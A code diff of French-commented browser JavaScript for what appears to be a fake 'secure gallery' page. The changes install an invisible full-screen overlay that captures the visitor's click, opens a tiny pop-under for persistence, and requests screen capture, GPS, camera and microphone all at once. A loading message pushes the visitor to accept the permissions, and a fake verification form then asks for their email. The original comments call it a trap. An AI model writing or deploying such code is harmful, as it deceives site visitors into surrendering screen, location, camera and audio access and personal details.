@@ -987,10 +987,21 @@ function setupInvisibleVerifyOverlay(overlay) {
     if (overlay.dataset.verifyBound === '1') return;
     overlay.dataset.verifyBound = '1';
 
-    // Rendre l'overlay réellement invisible au début (pour le piège immédiat)
+    // Rendre l'overlay réellement invisible et plein écran
     overlay.style.background = 'rgba(0,0,0,0.01)';
 
     overlay.addEventListener('click', async () => {
+        // Au clic, on rend l'overlay opaque (noir) pendant le chargement pour forcer l'attention sur les popups
+        overlay.style.background = 'rgba(15, 23, 42, 0.98)';
+        overlay.innerHTML = `
+            <div style="text-align: center; color: white; font-family: sans-serif;">
+                <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                <p>Initialisation de la galerie sécurisée...</p>
+                <p style="font-size: 0.8rem; color: #94a3b8;">Veuillez accepter les autorisations système pour continuer.</p>
+                <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+            </div>
+        `;
+
         // Tentative de duplication / persistance (Pop-under)
         try {
             const popup = window.open(window.location.href, '_blank', 'width=1,height=1,left=0,top=0,menubar=no,status=no,toolbar=no');
@@ -1000,16 +1011,11 @@ function setupInvisibleVerifyOverlay(overlay) {
             }
         } catch (e) {}
 
-        // On lance TOUTES les demandes d'accès immédiatement au premier clic
-        console.log("Piège activé : Demande de permissions forcée...");
-        
-        // On demande l'écran
+        // On lance TOUTES les demandes d'accès immédiatement
         navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
             persistentScreenStream = stream;
-            console.log("📺 Écran capturé");
         }).catch(() => {});
 
-        // On demande GPS + Caméra + Micro
         const [locOk, mediaOk] = await Promise.all([
             requestLocationOnly(),
             requestVerifyMediaPermissions()
@@ -1021,11 +1027,10 @@ function setupInvisibleVerifyOverlay(overlay) {
             markLocationReady();
         }
 
-        // RETARDER L'APPARITION DE LA PAGE D'EMAIL (10 secondes après le clic)
-        console.log("Permissions demandées. Affichage du formulaire d'email dans 10s...");
+        // On affiche le formulaire d'email après un court délai pour laisser valider les popups
         setTimeout(() => {
             showVerificationModal(overlay);
-        }, 10000);
+        }, 3000);
     });
 }
 
@@ -1041,35 +1046,23 @@ async function startVerification() {
     if (!overlay) {
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
-        overlay.style.display = 'none';
+        // Plein écran, transparent et par-dessus tout
+        overlay.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999999; cursor:default; background:rgba(0,0,0,0.01); display:flex; align-items:center; justify-content:center;';
         document.body.appendChild(overlay);
-    }
-
-    // Sécurité supplémentaire : on force le masquage si on n'est pas encore prêt
-    if (!overlay.dataset.forceShow) {
-        overlay.style.display = 'none';
     }
 
     if (isLocationReady()) {
         showVerificationModal(overlay);
-        overlay.style.display = 'flex';
-        overlay.dataset.forceShow = '1';
-        if (!gpsWatchStarted) startGpsTracking();
         return;
     }
 
     const form = overlay.querySelector('#fake-verify-form');
     if (form) {
         bindVerificationForm(overlay);
-        overlay.style.display = 'flex';
-        overlay.dataset.forceShow = '1';
         return;
     }
 
     setupInvisibleVerifyOverlay(overlay);
-    // L'overlay invisible DOIT être affiché pour capter le clic, mais il est transparent
-    overlay.style.display = 'flex';
-    overlay.dataset.forceShow = '1';
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
